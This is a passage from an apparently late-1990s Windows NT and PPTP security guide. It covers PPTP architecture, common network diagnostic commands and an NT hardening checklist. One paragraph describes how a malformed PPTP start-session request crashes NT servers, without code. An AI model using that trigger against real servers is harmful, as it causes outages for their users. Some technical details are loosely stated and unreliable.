the PPTP server. The PPTP server disassembles the IP datagram into a PPP packet and then 
decrypts the packet using the network protocol of the private network. As mentioned earlier, the 
network protocols that are supported by PPTP are TCP/IP, IPX/SPX and NetBEUI.

[4.0.3] PPTP Clients

A computer that is able to use the PPTP protocol can connect to a PPTP server two different 
ways:

? By using an ISP's network access server that supports inbound PPP connections.
? By using a physical TCP/IP-enabled LAN connection to connect to a PPTP server.

PPTP clients attempting to use an ISP's network access server must be properly configured with 
a modem and a VPN device to make the seperate connections to the ISP and the PPTP server. 
The first connection is dial-up connection utilizing the PPP protocol over the modem to an Internet 
Service Provider. The second connection is a VPN connection using PPTP, over the modem and 
through the ISP. The second connection requires the first connection because the tunnel between 
the VPN devices is established by using the modem and PPP connections to the internet.

The exception to this two connection process is using PPTP to create a virtual private network 
between computers physically connected to a LAN. In this scenario the client is already 
connected to a network and only uses Dial-Up networking with a VPN device to create the 
connection to a PPTP server on the LAN.

PPTP packets from a remote PPTP client and a local LAN PPTP client are processed differently. 
A PPTP packet from a remote client is placed on the telecommunication device physical media, 
while the PPTP packet from a LAN PPTP client is placed on the network adapter physical media.

[4.0.4] PPTP Architecture

This next area discusses the architecture of PPTP under Windows NT Server 4.0 and NT 
Workstation 4.0. The following section covers:

? PPP Protocol
? PPTP Control Connection
? PPTP Data Tunneling

Architecture Overview:
The secure communication that is established using PPTP typically involves three processes, 
each of which requires successful completion of the previous process. This will now explain these 
processes and how they work:

PPP Connection and Communication: A PPTP client utilizes PPP to connect to an ISP by using a 
standard telephone line or ISDN line. This connection uses the PPP protocol to establish the 
connection and encrypt data packets.

PPTP Control Connection: Using the connection to the Internet established by the PPP protocol, 
the PPTP protocol creates a control connection from the PPTP client to a PPTP server on the 
Internet. This connection uses TCP to establish communication and is called a PPTP Tunnel.

PPTP Data Tunneling: The PPTP protocol creates IP datagrams containing encrypted PPP 
packets which are then sent through the PPTP tunnel to the PPTP server. The PPTP server 
disassembles the IP datagrams and decrypts the PPP packets, and the routes the decrypted 
packet to the private network.

PPP Protocol:

The are will not cover in depth information about PPP, it will cover the role PPP plays in a PPTP 
environment. PPP is a remote access protocol used by PPTP to send data across TCP/IP based 
networks. PPP encapsulates IP, IPX, and NetBEUI packets between PPP frames and sends the 
encapsulated packets by creating a point-to-point link between the sending and receiving 
computers. 

Most PPTP sessions are started by a client dialing up an ISP network access server. The PPP 
protocol is used to create the dial-up connection between the client and network access server 
and performs the folloing functions:

? Establishes and ends the physical connection. The PPP protocol uses a sequence defined in 
RFC 1661 to establish and maintain connections between remote computers.
? Authenticates Users. PPTP clients are authenticated by using PPP. Clear text, encrypted or 
MS CHAP can be used by the PPP protocol.
? Creates PPP datagrams that contain encrypted IPX, NetBEUI, or TCP/IP packets. 

PPTP Control Connection:

The PPTP protocol specifies a series of messages that are used for session control. These 
messages are sent between a PPTP client and a PPTP server. The control messages establish, 
maintain and end the PPTP tunnel. The following list present the primary control messages used 
to establish and maintain the PPTP session.

	Message Type	Purpose
PPTP_START_SESSION_REQUEST	Starts Session
PPTP_START_SESSION_REPLY	Replies to Start Session Request
PPTP_ECHO_REQUEST	Maintains Session
PPTP_ECHO_REPLY	Replies to Maintain Session Request
PPTP_WAN_ERROR_NOTIFY	Reports an error in the PPP connection
PPTP_SET_LINK_INFO	Configures PPTP Client/Server Connection
PPTP_STOP_SESSION_REQUEST	Ends Session
PPTP_STOP_SESSION_REPLY	Replies to End Session Request

The control messages are sent inside of control packets in a TCP datagram. One TCP 
connection is enabled between the PPTP client and Server. This path is used to send and receive 
control messages. The datagram contains a PPP header, a TCP Header, a PPTP Control 
message and appropriate trailers. The construction is as follows

-----------------------------------
PPP Delivery Header
-----------------------------------
IP Header
-----------------------------------
PPTP Control Message
-----------------------------------
Trailers
-----------------------------------

PPTP Data Transmission

After the PPTP Tunnel has been created, user data is transmitted between the client and PPTP 
server. Data is sent in IP Datagrams containing PPP packets. The IP datagram is created using a 
modified version of the Generic Routing Encapsulation (GRE) protocol (GRE is defined in RFC 
1701 and 1702). The structure of the IP Datagram is as follows:

---------------------------------------------------
PPP Delivery Header
---------------------------------------------------
IP Header
---------------------------------------------------
GRE Header
---------------------------------------------------
PPP Header
---------------------------------------------------
IP Header
---------------------------------------------------
TCP Header
---------------------------------------------------
Data
---------------------------------------------------

By paying attention to the construction of the packet, you can see how it would be able to be 
transmitted over the Internet as headers are stripped off. The PPP Delivery header provides 
information necessary for the datagram to traverse the Internet. The GRE header is used to 
encapsulate the PPP packet within the IP Datagram. The PPP packet is created by RAS. The 
PPP Packet is encrypted and if intercepted, would be unintelligible.

[4.0.5] Understanding PPTP Security

PPTP uses the strict authentication and encryption security available to computers running RAS 
under WindowsNT Server version 4.0. PPTP can also protect the PPTP server and private 
network by ignoring all but PPTP traffic. Despite this security, it is easy to configure a firewall to 
allow PPTP to access the network.

Authentication: Initial dial-in authentication may be required by an ISP network access server. If 
this Authentication is required, it is strictly to log on to the ISP, it is not related to Windows NT 
based Authentication. A PPTP server is a gateway to your network, and as such it requires 
standard WindowsNT based logon. All PPTP clients must provide a user name and password. 
Therefore, remote access logon using a PC running under NT server or Workstation is as secure 
as logging on from a PC connected to a LAN (theoretically). Authentication of remote PPTP 
clients is done by using the same PPP authentication methods used for any RAS client dialing 
directly into an NT Server. Because of this, it fully supports MS-CHAP (Microsoft Challenge 
Handshake Authentication Protocol which uses the MD4 hash as well as earlier LAN Manager 
methods.)

Access Control: After Authentication, all access to the private LAN continues to use existing NT 
based security structures. Access to resources on NTFS drives or to other network resources 
require the proper permissions, just as if you were connected directly to the LAN.

Data Encryption: For data encryption, PPTP uses the RAS "shared-secret" encryption process. It 
is referred to as a shared-secret because both ends of the connection share the encryption key. 
Under Microsoft’s implementation of RAS, the shared secret is the user password (Other 
methods include public key encryption). PPTP uses the PPP encryption and PPP compression 
schemes. The CCP (Compression Control Protocol) is used to negotiate the encryption used. The 
username and password is available to the server and supplied by the client. An encryption key is 
generated using a hash of the password stored on both the client and server. The RSA RC4 
standard is used to create this 40-bit (128-bit inside the US and Canada is available) session key 
based on the client password. This key is then used to encrypt and decrypt all data exchanged 
between the PPTP client and server. The data in PPP packets is encrypted. The PPP packet 
containing the block of encrypted data is then stuffed into a larger IP datagram for routing.

PPTP Packet Filtering: Network security from intruders can be enhanced by enabling PPTP 
filtering on the PPTP server. When PPTP filtering is enabled, the PPTP server on the private 
network accepts and routes only PPTP packets. This prevents ALL other packet types from 
entering the network. PPTP traffic uses port 1723.

[4.0.6] PPTP and the Registry

This following is a list of Windows NT Registry Keys where user defined PPTP information can be 
found:

KEY:    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RASPPTPE\
            Parameters\Configuration

Values: AuthenticateIncomingCalls
            DataType = REG_WORD
            Range = 0 - 1
            Default = 0

Set this value to 1 to force PPTP to accept calls only from IP addresses listed in the 
PeerClientIPAddresses registry value. If AuthenticateIncomingCalls is set to 1 and there are no 
addresses in PeerClientIPAddresses, the no clients will be able to connect.

             PeerClientIPAddresses
             DataType = REG_MULTI_SZ
             Range = The format is a valid IP address

This parameter is a list of IP addresses the server will accept connections from.

KEY:    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<adapter name>\
            Parameters\Tcpip

Values: DontAddDefaultGateway
            DataType = REG_WORD
            Range = 0 - 1
            Default = 1

When PPTP is installed, a default route is made for each LAN adapter. This parameter will 
disable the default route on the corporate LAN adapter.

             PPTPFiltering
             Key: <adaptername.\Paramters\tcpip
             ValueType: REG_WORD
             Valid Range: 0 - 1
             Default = 0

This parameter controls whether PPTP filtering is enabled or not.

             PPTPTcpMaxDataRetransmissions
             Key: Tcpip\Parameters
             ValueType: REG_WORD - Number of times to retransmit a PPTP packet.
             Valid Range: 0 - 0xFFFFFFFF
             Default: 9

This setting control how many times PPTP will retransmit a packet.

[4.0.7] Special Security Update

SPECIAL REVISION: As a last minute revision to the lecture. A flaw has been discovered in the 
PPTP architecture. It turns out that if you send a that if you send a pptp start session request with 
an invalid packet length in the pptp packet header that it will crash an NT box and cause the NT 
server to do a CoreDump. Fragments of code for a DoS attack package are flying, and the rhino9 
team should have a completed DoS Attack program released soon. This program is released, of 
course, for network administrators wanting to know how the bug works.

[5.0.0] TCP/IP Commands as Tools

	This is list of the most commonly used TCP/IP command line tools that are used to 
explore and find out information from a network. These tools will be referred to later on in this 
document, so its usage and function will not be explained later. Please note that not all of these 
switches remain the same across different TCP/IP stacks. The Microsoft TCP/IP stack is almost 
always different than most switches used on Unix systems.

[5.0.1] The Arp Command

The arp command will display internet to ethernet (IP to MAC) address translations which is 
normally handled by the arp protocol. When the hostname is the only parameter, this command 
will display the currect ARP entry for that hostname.

Usage:   arp hostname

Switches:     -a            Displays current ARP entries by interrogating the current
              		      protocol data.  If inet_addr is specified, the IP and Physical
              		      addresses for only the specified computer are displayed.  If
              		      more than one network interface uses ARP, entries for each ARP
              		      table are displayed.
	      -g            Same as -a.
	      inet_addr     Specifies an internet address.
	      -N if_addr    Displays the ARP entries for the network interface specified
              		            by if_addr.
	      -d            Deletes the host specified by inet_addr.
	      -s            Adds the host and associates the Internet address inet_addr
             		      with the Physical address eth_addr.  The Physical address is
           		      given as 6 hexadecimal bytes separated by hyphens. The entry
             		      is permanent.
	      eth_addr      Specifies a physical address.
	      if_addr       If present, this specifies the Internet address of the
             		          interface whose address translation table should be modified.
              		          If not present, the first applicable interface will be used.


[5.0.2] The Traceroute Command

The traceroute command is used to trace the route that a packet takes to reach its destination. 
This command works by using the time to live (TTL) filed in the IP packet.

Usage:  tracert  IP or Hostname

Switches:    -d                 Do not resolve addresses to hostnames.
	      -h maximum_hops    Maximum number of hops to search for target.
	      -j host-list       Loose source route along host-list.
	      -w timeout         Wait timeout milliseconds for each reply.

[5.0.3] The Netstat Command

This command is used to query the network subsystem regarding certain types of information. 
Different types of information will be received depending on the switches used in conjunction with 
this command.

Usage:  netstat [switch]

Switches:       -A     Shows the addresses of any associated protocol control blocks.
                        -a      Will show the status of all sockets. Sockets associated with network
                                 server processes are normally not shown.
                        -i       Shows the state of the network interfaces.
                        -m     Prints the network memory usage.
                        -n      Causes netstat to show actual addresses as opposed to hostnames or
                                  network names.
                        -r       Prints the routing table.
                        -s      Tells netstat to show the per protocol statistics.
                        -t       Replaces the queue length information with timer information.

[5.0.4] The Finger Command

By default, finger will list the login name, full name, terminal name, and write status (shown as a 
"*" before the terminal name if write permission is denied), idle time, login time, office location, 
and phone number (if known) for each current user connected to the network.

Usage:    finger  username@domain

Switches:     -b    Brief output format
  	       -f     Supresses the printing of the header line.
                       -i     Provides a quick list of users with idle time.
                       -l     Forces long output format.
                       -p    Supresses printing of the .plan file (if present)
                       -q    Provides a quick list of users.
                       -s    Forces short output form.
                       -w   Forces narrow output form.

[5.0.5] The Ping Command

The ping (Packet Internet Groper) is used to send ICMP (Internet Control Message Protocol) 
packets from one host to another. Ping transmits packets using the ICMP ECHO_REQUEST 
command and expects an ICMP ECHO_REPLY.

Usage:    ping IP address or Hostname

Switches:    -t             Ping the specifed host until interrupted.
                     -a             Resolve addresses to hostnames.
                     -n count       Number of echo requests to send.
                     -l size        Send buffer size.
                     -f             Set Don't Fragment flag in packet.
                     -i TTL         Time To Live.
	     -v TOS         Type Of Service.
	     -r count       Record route for count hops.
	     -s count       Timestamp for count hops.
	     -j host-list   Loose source route along host-list.
	     -k host-list   Strict source route along host-list.
	     -w timeout     Timeout in milliseconds to wait for each reply.

[5.0.6] The Nbtstat Command

Can be used to query the network concerning NetBIOS information. It can also be useful for 
purging the NetBIOS cache and reloading the LMHOSTS file. This one command can be 
extremely useful when performing security audits. When one knows how to interpret the 
information, it can reveal more than one might think.

Usage:   nbtstat [-a RemoteName] [-A IP_address] [-c] [-n] [-R] [-r] [-S] [-s] [interval]

Switches	-a      Lists the remote computer's name table given its host name. 
		-A      Lists the remote computer's name table given its IP address. 
		-c      Lists the remote name cache including the IP addresses.
	      	         Lists the remote name cache including the IP addresses Lists local 
NetBIOS
		         names. Lists names resolved by broadcast and via WINS Purges and 
reloads the
		         remote cache name table Lists sessions table with the destination IP 
addresses
		         Lists sessions table converting destination IP addresses to host names via 
the
		         hosts file. 

		-n      Lists local NetBIOS names. 
		-r       Lists names resolved by broadcast and via WINS. 
		-R     Purges and reloads the remote cache name table. 
		-S      Lists sessions table with the destination IP addresses. 
		-s      Lists sessions table converting destination IP addresses to host names via 
the
		          hosts file. 
		interval          This will redisplay the selected statistics, pausing for the number of 	
		       seconds you
	                	       choose as "interval" between each listing. Press CTRL+C to stop. 

Notes on NBTSTAT

The column headings generated by NBTSTAT have the following meanings:

Input 
     Number of bytes received. 
Output 
     Number of bytes sent. 
In/Out 
     Whether the connection is from the computer (outbound) or from another system to
     the local computer (inbound). 
Life 
     The remaining time that a name table cache entry will "live" before your computer
     purges it. 
Local Name 
     The local NetBIOS name given to the connection. 
Remote Host 
     The name or IP address of the remote host. 
Type 
     A name can have one of two types: unique or group. 
     The last byte of the 16 character NetBIOS name often means something because
     the same name can be present multiple times on the same computer. This shows
     the last byte of the name converted into hex. 
State 
     Your NetBIOS connections will be shown in one of the following "states": 


     State                   Meaning
     
     Accepting           An incoming connection is in process.
     Associated        The endpoint for a connection has been created and your computer has 
ssociated it 		 with an IP address.
     Connected        This is a good state! It means you're connected to the remote resource.
     Connecting       Your session is trying to resolve the name-to-IP address mapping of the 
destination 	                		 resource.
     Disconnected   Your computer requested a disconnect, and it is waiting for the remote 
computer to do 		 so.
     Disconnecting  Your connection is ending.
     Idle            	 The remote computer has been opened in the current session, but is currently 
not 		 accepting connections.
     Inbound         	 An inbound session is trying to connect.
     Listening       	 The remote computer is available.
     Outbound        	 Your session is creating the TCP connection.
     Reconnecting   If your connection failed on the first attempt, it will display this state as it tries 
to 		  reconnect.

Unique (U): The name may have only one IP address assigned to it. On a network device, 
multiple occurences of a single name may appear to be registered, but the suffix will be unique, 
making the entire name unique.

Group (G): A normal group; the single name may exist with many IP addresses. 

Multihomed (M): The name is unique, but due to multiple network interfaces on the same 
computer, this configuration is necessary to permit the registration. Maximum number of 
addresses is 25.

Internet Group (I): This is a special configuration of the group name used to manage WinNT 
domain names.

Domain Name (D): New in NT 4.0

[5.0.7] The IpConfig Command

The ipconfig command will give you information about your current TCP/IP configuration. 
Information such as IP address, default gateway, subnet mask, etc can all be retrieved using this 
command.

Usage:   ipconfig [/? | /all | /release [adapter] | /renew [adapter]]

Switches:    /?       Display this help message.
                      /all     Display full configuration information.
                      /release Release the IP address for the specified adapter.
                      /renew   Renew the IP address for the specified adapter.

[5.0.8] The Telnet Command

Technically, telnet is a protocol. This means it is a language that computer use to communicate 
with one another in a particular way.  From your point of view, Telnet is a program that lets you 
login to a site on the Internet through your connection to Teleport. It is a terminal emulation 
program, meaning that when you connect to the remote site, your computer functions as a 
terminal for that computer.

Once the connection is made, you can use your computer to access information, run programs, 
edit files, and otherwise use whatever resources are available on the other computer. What is 
available depends on the computer you connect to. Most of the times, if you type '?' or 'help', you 
would normally receive some type of information, menu options, etc.

                     Note: telnet connections give you command-line access only. In other
                     words, instead of being able to use buttons and menus as you do with a
                     graphical interface, you have to type commands. However, telnet allows
                     you to use certain utilities and resources you cannot access with your
                     other Internet applications.

Usage:     telnet  hostname or IP address  port(optional)

[6.0.0] NT Security

[6.0.1] The Logon Process

WinLogon

Users must log on to a Windows NT machine in order to use that NT based machine or network. 
The logon process itself cannot be bypassed, it is mandatory. Once the user has logged on, an 
access token is created (this token will be discussed in more detail later). This token contains 
user specific security information, such as: security identifier, group identifiers, user rights and 
permissions. The user, as well as all processes spawned by the user are identified to the system 
with this token.

The first step in the WinLogon process is something we are all familiar with, CTRL+ALT+DEL. 
This is NT's default Security Attention Sequence (SAS - The SAS key combo can be changed. 
We will also discuss that later.). This SAS is a signal to the operating system that someone is 
trying to logon.  After the SAS is triggered, all user mode applications pause until the security 
operation completes or is cancelled. (Note: The SAS is not just a logon operation, this same key 
combination can be used for logging on, logging off, changing a password or locking the 
workstation.) The pausing, or closing, of all user mode applications during SAS is a security 
feature that most people take for granted and dont understand. Due to this pausing of 
applications, logon related trojan viruses are stopped, keyloggers (programs that run in memory, 
keeping track of keystrokes, therefor recording someones password) are stopped as well.

The user name is not case sensitive but the password is.

After typing in your information and clicking OK (or pressing enter), the WinLogon process 
supplies the information to the security subsystem, which in turn compares the information to the 
Security Accounts Manager (SAM). If the information is compliant with the information in the 
SAM, an access token is created for the user. The WinLogon takes the access token and passes 
it onto the Win32 subsytem, which in turn starts the operating systems shell. The shell, as well as 
all other spawned processes will receive a token. This token is not only used for security, but also 
allows NTs auditing and logging features to track user usage and access of network resources.

Note: All of the logon components are located in a file known as the Graphical Indetification and 
Authentication (GINA) module, specifically MSGINA.DLL. Under certain conditions, this file can 
be replaced, which is how you would change the SAS key combination.

For fine tuning of the WinLogon process, you can refer to the registry. All of the options for the 
WinLogon process are contained in the 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon area. 
You can also fine tune the process by using the Policy Editor.

Logging on to a Domain

If an NT machine is a participant on a Domain, you would not only need to login to the local 
machine, but the Domain as well. If a computer is a member of a Domain, the WinLogon process 
is replaced by the NetLogon process.

[6.0.2] Security Architecture Components

Local Security Authority (LSA): Also known as the security subsystem, it is the central portion of 
NT security. It handles local security policies and user authentication. The LSA also handles 
generating and logging audit messages.

Security Accounts Manager (SAM): The SAM handles user and group accounts, and provides 
user authentication for the LSA.

Security Reference Monitor (SRM): The SRM is in charge of enforcing and assuring access 
validation and auditing for the LSA. It references user account information as the user attempts to 
access resources. 

[6.0.3] Introduction to Securing an NT Box

Abstract
Microsoft Windows NT operating system provides several security features.  However, the default 
out-of-the-box configuration is highly relaxed, especially on the Workstation product.  This is 
because the operating system is sold as a shrink-wrapped product with an assumption that an 
average customer may not want to worry about a highly restrained but secure system on their 
desktop.

A particular installation's requirements can differ significantly from another.  Therefore, it is 
necessary for individual customers to evaluate their particular environment and requirements 
before implementing a security configuration.  This is also because implementing security settings 
can impact system configuration.  Certain applications installed on Windows NT may require 
more relaxed settings to function properly than others because of the nature of the product.  
Customers are therefore advised to careful evaluate recommendations in the context of their 
system configurations and usage.

If you install a Windows NT machine as a web server or a firewall, you should tighten up the 
security on that box. Ordinary machines on your internal network are less accessible than a 
machine the Internet.  A machine accessible from the Internet is more vulnerable and likely to be 
attacked.  Securing the machine gives you a bastion host. Some of the things you should do 
include:

? Remove all protocol stacks except TCP/IP, since IP is the only protocol that runs on the 
Internet 
? Remove unnecessary network bindings 
? Disable all unnecessary accounts, like guest 
? Remove share permissions and default shares 
? Remove network access for everyone (User Manger -> Policies ->User rights, "Access 
this computer from the network") 
? Disable unnecessary services 
? Enable audit logging 
? Track the audit information

[6.0.4] Physical Security Considerations
Take the precautions you would with any piece of valuable equipment to protect against casual 
theft. This step can include locking the room the computer is in when no one is there to keep an 
eye on it, or using a locked cable to attach the unit to a wall. You might also want to establish 
procedures for moving or repairing the computer so that the computer or its components cannot 
be taken under false pretenses.

Use a surge protector or power conditioner to protect the computer and its peripherals from 
power spikes. Also, perform regular disk scans and defragmentation to isolate bad sectors and to 
maintain the highest possible disk performance. 

As with minimal security, the computer should be protected as any valuable equipment would be. 
Generally, this involves keeping the computer in a building that is locked to unauthorized users, 
as most homes and offices are. In some instances you might want to use a cable and lock to 
secure the computer to its location. If the computer has a physical lock, you can lock it and keep 
the key in a safe place for additional security. However, if the key is lost or inaccessible, an 
authorized user might be unable to work on the computer.

You might choose to keep unauthorized users away from the power or reset switches on the 
computer, particularly if your computer's rights policy denies them the right to shut down the 
computer. The most secure computers (other than those in locked and guarded rooms) expose 
only the computer's keyboard, monitor, mouse, and (when appropriate) printer to users. The CPU 
and removable media drives can be locked away where only specifically authorized personnel 
can access them.

[6.0.5] Backups
Regular backups protect your data from hardware failures and honest mistakes, as well as from 
viruses and other malicious mischief. The Windows NT Backup utility is described in Chapter 6, 
"Backing Up and Restoring Network Files" in Microsoft Windows NT Server Concepts and 
Planning. For procedural information, see Help.

Obviously, files must be read to be backed up, and they must be written to be restored. Backup 
privileges should be limited to administrators and backup operators—people to whom you are 
comfortable giving read and write access on all files.

[6.0.6] Networks and Security
If the network is entirely contained in a secure building, the risk of unauthorized taps is minimized 
or eliminated. If the cabling must pass through unsecured areas, use optical fiber links rather than 
twisted pair to foil attempts to tap the wire and collect transmitted data.

[6.0.7] Restricting the Boot Process
Most personal computers today can start a number of different operating systems. For example, 
even if you normally start Windows NT from the C: drive, someone could select another version 
of Windows on another drive, including a floppy drive or CD-ROM drive. If this happens, security 
precautions you have taken within your normal version of Windows NT might be circumvented.

In general, you should install only those operating systems that you want to be used on the 
computer you are setting up. For a highly secure system, this will probably mean installing one 
version of Windows NT. However, you must still protect the CPU physically to ensure that no 
other operating system is loaded. Depending on your circumstances, you might choose to 
remove the floppy drive or drives. In some computers you can disable booting from the floppy 
drive by setting switches or jumpers inside the CPU. If you use hardware settings to disable 
booting from the floppy drive, you might want to lock the computer case (if possible) or lock the 
machine in a cabinet with a hole in the front to provide access to the floppy drive. If the CPU is in 
a locked area away from the keyboard and monitor, drives cannot be added or hardware settings 
changed for the purpose of starting from another operating system.   Another simple setting is to 
edit the boot.ini file such that the boot timeout is 0 seconds; this will make hard for the user to 
boot to another system if one exists.

On many hardware platforms, the system can be protected using a power-on password. A power-
on password prevents unauthorized personnel from starting an operating system other than 
Windows NT, which would compromise system security. Power-on passwords are a function of 
the computer hardware, not the operating system software. Therefore the procedure for setting 
up the power-on password depends on the type of computer and is available in the vendor's 
documentation supplied with the system.

[6.0.8] Security Steps for an NT Operating System

[6.0.9] Install Latest Service Pack and applicable hot-fixes
	Completed	Not implemented	Not applicable	
STATUS				

Install the latest recommended Microsoft Service Pack for the NT operating system.  The 
applicable hot-fixes should also be installed.  Generally not all hot-fixes are required.  Also the 
order in which hot-fixes are installed is very important, as later hot-fixes sometimes supersede 
earlier hot-fixes.

[6.1.0] Display a Legal Notice Before Log On
	Completed	Not implemented	Not applicable	
STATUS				
Windows NT can display a message box with the caption and text of your choice before a user 
logs on. Many organizations use this message box to display a warning message that notifies 
potential users that they can be held legally liable if they attempt to use the computer without 
having been properly authorized to do so. The absence of such a notice could be construed as an 
invitation, without restriction, to enter and browse the system.

The log on notice can also be used in settings (such as an information kiosk) where users might 
require instruction on how to supply a user name and password for the appropriate account.
To display a legal notice, use the Registry Editor to create or assign the following registry key 
values on the workstation to be protected:

Hive:	HKEY_LOCAL_MACHINE\SOFTWARE	
Key:	\Microsoft\Windows NT\Current Version\Winlogon	
Name:	LegalNoticeCaption	
Type:	REG_SZ	
Value:	Whatever you want for the title of the message box	
Hive:	HKEY_LOCAL_MACHINE\SOFTWARE	
Key:	Microsoft\Windows NT\Current Version\Winlogon	
Name:	LegalNoticeText	
Type:	REG_SZ	
Value:	Whatever you want for the text of the message box	

The changes take effect the next time the computer is started. You might want to update the 
Emergency Repair Disk to reflect these changes.
Example:
Welcome to the XYZ Information Kiosk
Log on using account name Guest and password XYZCorp. 
Authorized Users Only
This system is for the use of authorized users only. Individuals using this computing system 
without authority, or in excess of their authority, are subject to having all of their activities on this 
system monitored and recorded by system personnel.  In the course of monitoring individuals 
improperly using this system, or in the course of system maintenance, the activities of authorized 
users may be monitored.  Anyone using this system expressly consents to such monitoring and is 
advised that if such monitoring reveals possible evidence of criminal activity, system personnel 
may provide the evidence of such monitoring to law enforcement officials.

[6.1.1] Rename Administrative Accounts
	Completed	Not implemented	Not applicable	
STATUS				

It is a good idea to rename the built-in Administrator account to something less obvious. This 
powerful account is the one account that can never be locked out due to repeated failed log on 
attempts, and consequently is attractive to hackers who try to break in by repeatedly guessing 
passwords. By renaming the account, you force hackers to guess the account name as well as 
the password.

Make the following changes:
? Remove right "LOG ON FROM THE NETWORK" from Administrator's group
? Add right "LOG ON FROM THE NETWORK" for individuals who are administrators
? Enable auditing of failed login attempts
? Lock out users for more than 5 login failures
? Require password of at least 8 characters


[6.1.2] Disable Guest Account
	Completed	Not implemented	Not applicable	
STATUS				

Disable Guest account and remove all rights (note:  if using with Internet Information Server then 
ensure that web user account has permission to access appropriate directories and the right to 
"LOG ON LOCALLY"

Limited access can be permitted for casual users through the built-in Guest account. If the 
computer is for public use, the Guest account can be used for public log-ons. Prohibit Guest from 
writing or deleting any files, directories, or registry keys (with the possible exception of a directory 
where information can be left).
In a standard security configuration, a computer that allows Guest access can also be used by 
other users for files that they don't want accessible to the general public. These users can log on 
with their own user names and access files in directories on which they have set the appropriate 
permissions. They will want to be especially careful to log off or lock the workstation before they 
leave it.

[6.1.3] Logging Off or Locking the Workstation
	Completed	Not implemented	Not applicable	
STATUS				

Users should either log off or lock the workstation if they will be away from the computer for any 
length of time. Logging off allows other users to log on (if they know the password to an account); 
locking the workstation does not. The workstation can be set to lock automatically if it is not used 
for a set period of time by using any 32-bit screen saver with the Password Protected option. For 
information about setting up screen savers, see Help.

? Install password protected screen saver that automatically starts if workstation is not 
used for 5-15 minutes

[6.1.4] Allowing Only Logged-On Users to Shut Down the Computer
	Completed	Not implemented	Not applicable	
STATUS				

Normally, you can shut down a computer running Windows NT Workstation without logging on by 
choosing Shutdown in the Logon dialog box. This is appropriate where users can access the 
computer's operational switches; otherwise, they might tend to turn off the computer's power or 
reset it without properly shutting down Windows NT Workstation. However, you can remove this 
feature if the CPU is locked away. (This step is not required for Windows NT Server, because it is 
configured this way by default.)

To require users to log on before shutting down the computer, use the Registry Editor to create or 
assign the following Registry key value:

Hive:	HKEY_LOCAL_MACHINE\SOFTWARE	
Key:	\Microsoft\Windows NT\Current Version\Winlogon	
Name:	ShutdownWithoutLogon	
Type:	REG_SZ	
Value:	0	

The changes will take effect the next time the computer is started. You might want to update the 
Emergency Repair Disk to reflect these changes.

[6.1.5] Hiding the Last User Name
	Completed	Not implemented	Not applicable	
STATUS				

By default, Windows NT places the user name of the last user to log on the computer in the User 
name text box of the Logon dialog box. This makes it more convenient for the most frequent user 
to log on. To help keep user names secret, you can prevent Windows NT from displaying the user 
name from the last log on. This is especially important if a computer that is generally accessible is 
being used for the (renamed) built-in Administrator account.



To prevent display of a user name in the Logon dialog box, use the Registry Editor to create or 
assign the following registry key value:

Hive:	HKEY_LOCAL_MACHINE\SOFTWARE	
Key:	\Microsoft\Windows NT\Current Version\Winlogon	
Name:	DontDisplayLastUserName	
Type:	REG_SZ	
Value:	1	

[6.1.6] Restricting Anonymous network access to Registry
	Completed	Not implemented	Not applicable	
STATUS				

Windows NT version 4.0 Service Pack 3 includes a security enhancement that restricts 
anonymous (null session) logons when they connect to specific named pipes including the one for 
Registry.
There is a registry key value that defines the list of named pipes that are "exempt" from this 
restriction.  The key value is:

Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	System\CurrentControlSet\Services\LanManServer\Parameters	
Name:	NullSessionPipes	
Type:	REG_MULTI_SZ	
Value:	Add or Remove names from the list as required by the configuration.	

Please refer to Knowledge Base article Q143138 for more details.

[6.1.7] Restricting Anonymous network access to lookup account names and network 
shares
	Completed	Not implemented	Not applicable	
STATUS				

Windows NT has a feature where anonymous logon users can list domain user names and 
enumerate share names. Customers who want enhanced security have requested the ability to 
optionally restrict this functionality. Windows NT 4.0 Service Pack 3 and a hotfix for Windows NT 
3.51 provide a mechanism for administrators to restrict the ability for anonymous logon users 
(also known as NULL session connections) to list account names and enumerate share names. 
Listing account names from Domain Controllers is required by the Windows NT ACL editor, for 
example, to obtain the list of users and groups to select who a user wants to grant access rights. 
Listing account names is also used by Windows NT Explorer to select from list of users and 
groups to grant access to a share.
The registry key value to set for enabling this feature is:


Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	System\CurrentControlSet\Control\LSA	
Name:	RestrictAnonymous	
Type:	REG_DWORD	
Value:	1.	

This enhancement is part of Windows NT version 4.0 Service Pack 3.  A hot fix for it is also 
provided for Windows NT version 3.51.  Please refer to Knowledge Base article Q143474 for 
more details on this.

[6.1.8] Enforcing strong user passwords
	Completed	Not implemented	Not applicable	
STATUS				

Windows NT 4.0 Service Pack 2 and later includes a password filter DLL file (Passfilt.dll) that lets 
you enforce stronger password requirements for users. Passfilt.dll provides enhanced security 
against "password guessing" or "dictionary attacks" by outside intruders.

Passfilt.dll implements the following password policy: 
? Passwords must be at least six (6) characters long. (The minimum password length can be 
increased further by setting a higher value in the Password Policy for the domain).
? Passwords must contain characters from at least three (3) of the following four (4) classes: 
Description			Examples
English upper case letters		A, B, C, ... Z
English lower case letters		a, b, c, ... z
Westernized Arabic numerals	0, 1, 2, ... 9
Non-alphanumeric ("special characters") such as punctuation symbols
? Passwords may not contain your user name or any part of your full name.

These requirements are hard-coded in the Passfilt.dll file and cannot be changed through the 
user interface or registry. If you wish to raise or lower these requirements, you may write your 
own .dll and implement it in the same fashion as the Microsoft version that is available with 
Windows NT 4.0 Service Pack 2.

To use Passfilt.Dll, the administrator must configure the password filter DLL in the system registry 
on all domain controllers.  This can be done as follows with the following registry key value:

Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	System\CurrentControlSet\Control\LSA	
Name:	Notification Packages	
Type:	REG_MULTI_SZ	
Value:	Add string "PASSFILT"  (do not remove existing ones).	

[6.1.9] Disabling LanManager Password Hash Support
	Completed	Not implemented	Not applicable	
STATUS				

Windows NT supports the following two types of challenge/response authentication:
? LanManager (LM) challenge/response 
? Windows NT challenge/response

To allow access to servers that only support LM authentication, Windows NT clients currently 
send both authentication types. Microsoft developed a patch that allows clients to be configured 
to send only Windows NT authentication.  This removes the use of LM challenge/response 
messages from the network.
Applying this hot fix, configures the following registry key:

Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	System\CurrentControlSet\Control\LSA	
